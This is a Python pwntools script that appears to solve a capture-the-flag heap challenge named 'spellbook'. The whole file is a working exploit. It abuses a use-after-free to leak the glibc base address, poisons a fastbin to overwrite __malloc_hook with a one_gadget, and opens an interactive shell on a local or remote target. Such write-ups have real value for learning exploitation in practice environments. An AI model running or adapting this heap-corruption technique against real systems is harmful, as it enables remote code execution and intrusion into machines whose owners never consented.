#!/usr/bin/env python3

from pwn import *
from typing import Tuple

context.binary = elf = ELF('spellbook')
glibc = ELF('glibc/libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def add(p, entry: int, type_data: bytes, power: int, data: bytes):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'entry: ', str(entry).encode())
    p.sendlineafter(b'type: ', type_data)
    p.sendlineafter(b'power: ', str(power).encode())
    p.sendafter(b': ', data)


def show(p, entry: int) -> Tuple[bytes, bytes]:
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'entry: ', str(entry).encode())
    p.recvuntil(b'type: ')
    type_data = p.recvline().strip()
    p.recvuntil(b': ')
    data = p.recvline().strip()
    return type_data, data


def edit(p, entry: int, type_data: bytes, data: bytes):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'entry: ', str(entry).encode())
    p.sendlineafter(b'type: ', type_data)
    p.sendafter(b': ', data)


def delete(p, entry: int):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'entry: ', str(entry).encode())


def main():
    p = get_process()

    add(p, 0, b'A', 1000, b'A')
    add(p, 1, b'B',   16, b'B')
    delete(p, 0)

    _, leak = show(p, 0)
    glibc.address = u64(leak.ljust(8, b'\0')) - 0x3c4b78
    log.success(f'Glibc base address: {hex(glibc.address)}')

    add(p, 2, b'C', 0x68, b'C')

    delete(p, 2)
    delete(p, 1)

    edit(p, 2, b'c', p64(glibc.sym.__malloc_hook - 35))

    one_gadget = (0x45226, 0x4527a, 0xf03a4, 0xf1247)[1]

    add(p, 3, b'D', 0x68, b'D')
    add(p, 4, b'E', 0x68, cyclic(19) + p64(glibc.address + one_gadget))

    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'entry: ', b'5')
    p.interactive()


if __name__ == '__main__':
    main()
